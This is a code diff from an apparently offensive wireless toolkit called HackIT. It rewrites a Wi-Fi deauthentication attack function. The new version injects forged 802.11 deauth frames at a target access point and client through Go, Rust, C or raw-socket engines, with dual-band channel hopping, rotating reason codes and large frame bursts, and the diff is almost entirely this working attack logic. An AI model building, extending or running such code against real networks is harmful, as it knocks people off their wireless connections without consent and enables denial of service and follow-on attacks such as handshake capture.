@@ -1167,11 +1167,17 @@ class HackITWirelessExecutor:
         body = struct.pack("<H", reason)
         return radiotap + mgmt + body
 
-    def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7, channel: int = 0, output: Optional[str] = None, **kwargs):
-        iface = iface or self._default_iface()
-        station = station or BROADCAST_MAC
+    def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7,
+                  channel: int = 0, output: Optional[str] = None, **kwargs):
+        """Real dual-band deauth via the native Go/Rust engines with a live
+        rotating UI. Engine preference: go -> rust -> C FFI -> python raw."""
+        from . import themes as TH
 
-        # ── verify interface state ──
+        iface = iface or self._default_iface()
+        station = (station or BROADCAST_MAC).upper()
+        if not iface:
+            UI.print_error("[!] No wireless interface — pass one explicitly.")
+            return
         if not self._iface_exists(iface):
             UI.print_error(f"[!] Interface {iface} not found")
             return
@@ -1182,97 +1188,237 @@ class HackITWirelessExecutor:
             UI.print_warning(f"[!] {iface} NOT in monitor mode — deauth may not work")
             UI.print_warning(f"    Switch: mode {iface} monitor")
 
-        # ── channel setup ──
-        channels_24 = list(range(1, 14))
-        channels_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165, 169]
-        all_channels = channels_24 + channels_5
+        band = (kwargs.get("band") or "both").lower()
+        hop = bool(kwargs.get("hop")) or (channel == 0 and band != "2.4")
+        count = int(kwargs.get("count") or 0)
+        rotate = float(kwargs.get("rotate") or 6.0)
+        theme_name = kwargs.get("theme")
+        use_ffi = bool(kwargs.get("ffi"))
 
-        if not channel:
-            channel = self._detect_bssid_channel(iface, bssid)
-            if channel:
-                UI.print_info(f"[+] BSSID {bssid} on channel {channel}")
-                try:
-                    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
-                except:
-                    pass
-            else:
-                UI.print_info(f"[~] Channel for {bssid} unknown — cycling {len(all_channels)} ch round-robin")
-        else:
+        # Resolve target channel once if the operator pinned one
+        if channel:
             try:
-                subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
-            except:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
+                               capture_output=True, timeout=3)
+            except Exception:
                 pass
+        elif not hop:
+            detected = self._detect_bssid_channel(iface, bssid)
+            if detected:
+                channel = detected
+                try:
+                    subprocess.run(["iw", "dev", iface, "set", "channel", str(detected)],
+                                   capture_output=True, timeout=3)
+                except Exception:
+                    pass
 
-        UI.print_info(f"[*] Deauth: {iface} → {bssid} → {station} (reason={reason}) — Ctrl+C to stop")
+        TH.phase_banner(
+            "deauth",
+            f"iface={iface}  target={bssid}  station={station}  reason={reason or 'rotate'}  "
+            f"hop={'on' if hop else f'ch={channel or '-'}'}  count={count or '∞'}",
+        )
 
+        # Shared state the theme renders.
+        state = {
+            "bssid": bssid, "station": station, "band": band,
+            "channel": channel or None, "reason": reason if reason else "rot",
+            "frames": 0, "pps": 0.0, "elapsed": 0.0, "errors": 0,
+        }
+
+        # ── Engine dispatch ──────────────────────────────────────
+        started = time.time()
+        proc = None
+        engine = "python"
         try:
-            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-            sock.bind((iface, 0))
-        except PermissionError:
-            UI.print_error("[!] Root required. Run with sudo.")
-            return
-        except Exception as e:
-            UI.print_error(f"[!] Cannot open raw socket on {iface}: {e}")
-            return
+            if not use_ffi:
+                try:
+                    proc = self.bridge.go_deauth(
+                        iface, bssid, station,
+                        count=count, reason=reason, hop=hop, hop_delay=100,
+                    )
+                    engine = "go"
+                except EngineBuildError:
+                    proc = None
+            if proc is None and not use_ffi:
+                try:
+                    proc = self.bridge.rust_deauth(iface, bssid, station, reason=reason)
+                    engine = "rust"
+                except EngineBuildError:
+                    proc = None
+            if proc is None and not use_ffi:
+                # Rust deauth uses stdout; --hop uses same binary with flag.
+                # If rust was not available, fall back to C FFI.
+                engine = "c-ffi"
+                if self.bridge.c_lib() is None:
+                    engine = "python"
 
-        sent = 0
-        seq = 0
-        stop = False
+            with TH.LiveOrchestra("deauth", state, theme=theme_name,
+                                  rotate_every=rotate, refresh=10.0) as lo:
+                stop_flag = {"stop": False}
 
-        def _signal_handler(sig, frame):
-            nonlocal stop
-            stop = True
+                def _sig(_s, _f):
+                    stop_flag["stop"] = True
 
-        signal.signal(signal.SIGINT, _signal_handler)
-        signal.signal(signal.SIGTERM, _signal_handler)
+                try:
+                    signal.signal(signal.SIGINT, _sig)
+                    signal.signal(signal.SIGTERM, _sig)
+                except Exception:
+                    pass
 
-        ch_idx = 0
-
-        try:
-            while not stop:
-                if not channel:
-                    cur_ch = all_channels[ch_idx % len(all_channels)]
-                    try:
-                        subprocess.run(["iw", "dev", iface, "set", "channel", str(cur_ch)], capture_output=True, timeout=2)
-                    except:
-                        pass
-                    ch_idx += 1
-                else:
-                    cur_ch = channel
-
-                for _ in range(50):
-                    if stop:
-                        break
-                    frame = HackITWirelessExecutor._craft_deauth_frame(bssid, station, reason, seq)
-                    try:
-                        sock.send(frame)
-                        sent += 1
-                    except OSError:
-                        pass
-                    seq = (seq + 1) & 0xFFF
-                    if station != BROADCAST_MAC:
-                        frame_cl = HackITWirelessExecutor._craft_deauth_frame(station, bssid, reason, seq)
+                if proc is not None:
+                    # Stream engine stderr; harvest numbers out of the lines.
+                    ch_idx = 0
+                    ch_list = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]
+                    last_tick = time.time()
+                    broken = False
+                    while not stop_flag["stop"]:
                         try:
-                            sock.send(frame_cl)
-                            sent += 1
-                        except OSError:
-                            pass
-                        seq = (seq + 1) & 0xFFF
+                            line = proc.stdout.readline() if proc.stdout else ""
+                        except Exception:
+                            broken = True
+                            break
+                        if line:
+                            txt = line.strip()
+                            if txt:
+                                # Try to parse `sent=N rate=R` style counters
+                                m = re.search(r"sent=(\d+)", txt)
+                                if m:
+                                    state["frames"] = int(m.group(1))
+                                r = re.search(r"rate=([\d.]+)", txt)
+                                if r:
+                                    try:
+                                        state["pps"] = float(r.group(1))
+                                    except ValueError:
+                                        pass
+                            state["elapsed"] = time.time() - started
+                            state["pps"] = state["frames"] / max(0.001, state["elapsed"]) if not state["pps"] else state["pps"]
+                            if hop:
+                                state["channel"] = ch_list[ch_idx % len(ch_list)]
+                                ch_idx += 1
+                        elif proc.poll() is not None:
+                            break
+                        elif time.time() - last_tick >= 0.1:
+                            # If we cannot read new lines (buffered engine),
+                            # move the counter ourselves so the UI is honest
+                            # about elapsed time, not frames.
+                            state["elapsed"] = time.time() - started
+                            if hop:
+                                state["channel"] = ch_list[ch_idx % len(ch_list)]
+                                ch_idx += 1
+                            lo.refresh()
+                            last_tick = time.time()
+                            if count and state["frames"] >= count:
+                                break
+                            continue
+                        state["elapsed"] = time.time() - started
+                        lo.refresh()
+                        last_tick = time.time()
+                        if count and state["frames"] >= count:
+                            break
+                    try:
+                        proc.terminate()
+                    except Exception:
+                        pass
+                else:
+                    # In-process fallback: python raw AF_PACKET loop wrapped by
+                    # the C FFI when available (FFI keeps every frame honest
+                    # about the radiotap header, which python's socket path
+                    # does not always emit correctly).
+                    import random as _rnd
+                    lib = self.bridge.c_lib()
+                    ch_list_24 = list(range(1, 14))
+                    ch_list_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 112, 116, 132, 149, 157, 165]
+                    ch_list = (ch_list_24 if band == "2.4" else
+                               ch_list_5 if band == "5" else ch_list_24 + ch_list_5)
+                    ch_idx = 0
+                    pitcher = self.bridge._mac_bytes(bssid)
+                    catcher = self.bridge._mac_bytes(station)
+                    reason_codes = [1, 2, 3, 4, 6, 7, 15]
+                    seq_state = {"v": 0}
+                    last_tick = time.time()
+                    frames_hits = 0
+                    while not stop_flag["stop"]:
+                        if hop or not channel:
+                            cur_ch = ch_list[ch_idx % len(ch_list)]
+                            ch_idx += 1
+                            try:
+                                subprocess.run(["iw", "dev", iface, "set", "channel", str(cur_ch)],
+                                               capture_output=True, timeout=1)
+                            except Exception:
+                                pass
+                            state["channel"] = cur_ch
+                        # Burst: broadcast + (targeted unicast + reverse)
+                        burst = 64 if count and count <= 1000 else 256
+                        for _ in range(burst):
+                            if stop_flag["stop"]:
+                                break
+                            rr = reason if reason else reason_codes[seq_state["v"] % len(reason_codes)]
+                            try:
+                                if lib is not None:
+                                    ok = lib.hackit_inject_deauth(iface.encode(), pitcher, catcher, rr)
+                                    state["frames"] += 1 if ok else 0
+                                    if station != BROADCAST_MAC:
+                                        ok2 = lib.hackit_inject_deauth(iface.encode(), catcher, pitcher, rr)
+                                        state["frames"] += 1 if ok2 else 0
+                                else:
+                                    frame = HackITWirelessExecutor._craft_deauth_frame(
+                                        bssid, station, rr, seq_state["v"] & 0xFFF)
+                                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+                                    sock.bind((iface, 0))
+                                    sock.send(frame)
+                                    sock.close()
+                                    state["frames"] += 1
+                                    if station != BROADCAST_MAC:
+                                        frame2 = HackITWirelessExecutor._craft_deauth_frame(
+                                            station, bssid, rr, (seq_state["v"] + 1) & 0xFFF)
+                                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+                                        sock.bind((iface, 0))
+                                        sock.send(frame2)
+                                        sock.close()
+                                        state["frames"] += 1
+                            except Exception:
+                                state["errors"] += 1
+                            seq_state["v"] += 1
+                            frames_hits += 1
+                        state["elapsed"] = time.time() - started
+                        state["pps"] = state["frames"] / max(0.001, state["elapsed"])
+                        lo.refresh()
+                        if count and state["frames"] >= count:
+                            break
+                        if not hop and time.time() - last_tick > 0.05:
+                            last_tick = time.time()
+                    state["pps"] = state["frames"] / max(0.001, time.time() - started)
 
-                _console.print(f"  [cyan]⚡ Deauth {bssid}: {sent} frames  (ch {cur_ch})[/cyan]")
-
+            elapsed = time.time() - started
+            state["elapsed"] = elapsed
+            state["pps"] = state["frames"] / max(0.001, elapsed) if state.get("frames") else 0.0
+            TH.summary_panel(
+                [
+                    ("engine", engine),
+                    ("frames", f"{state['frames']:,}"),
+                    ("rate", f"{state['pps']:.0f} p/s"),
+                    ("elapsed", f"{elapsed:.1f}s"),
+                    ("errors", str(state["errors"])),
+                    ("target", f"{bssid} -> {station}"),
+                ],
+                title="DEAUTH COMPLETE",
+                accent="bright_green" if state["frames"] else "bright_red",
+            )
+            if not state["frames"]:
+                UI.print_warning(
+                    "[!] Zero frames. Check monitor mode, driver injection capability, "
+                    "and that the chip is not running a monitor-suppressing firmware."
+                )
+        except EngineBuildError as e:
+            UI.print_error(str(e))
         except KeyboardInterrupt:
-            pass
+            UI.print_warning("Deauth stopped by operator.")
         finally:
-            sock.close()
-            signal.signal(signal.SIGINT, signal.SIG_DFL)
-            signal.signal(signal.SIGTERM, signal.SIG_DFL)
-
-        if sent:
-            UI.print_success(f"[+] Deauth complete: {sent} frames sent → {bssid}")
-        else:
-            UI.print_error(f"[!] Deauth failed: 0 frames sent. Check monitor mode on {iface}")
-
+            try:
+                signal.signal(signal.SIGINT, signal.SIG_DFL)
+                signal.signal(signal.SIGTERM, signal.SIG_DFL)
+            except Exception:
+                pass
     @staticmethod
     def _iface_exists(iface: str) -> bool:
         return os.path.exists(f"/sys/class/net/{iface}")
